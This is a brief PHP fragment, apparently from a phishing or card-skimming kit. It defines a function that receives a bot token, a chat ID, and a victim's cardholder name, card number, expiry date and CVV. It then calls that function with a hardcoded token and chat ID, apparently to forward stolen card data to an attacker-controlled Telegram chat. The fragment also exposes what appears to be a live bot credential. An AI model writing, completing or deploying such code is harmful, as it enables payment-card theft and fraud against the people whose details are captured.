...
function foo($botToken, $chatID, $cardholder, $cardnumber, $exp, $cvv, $message) {
...
foo('7709941137:AAF8zjnw0zcyKeUGZp4XTbxq7qM3HUii0Ko', '8055889698', $cardholder, $cardnumber, $exp, $cvv, $message);
?>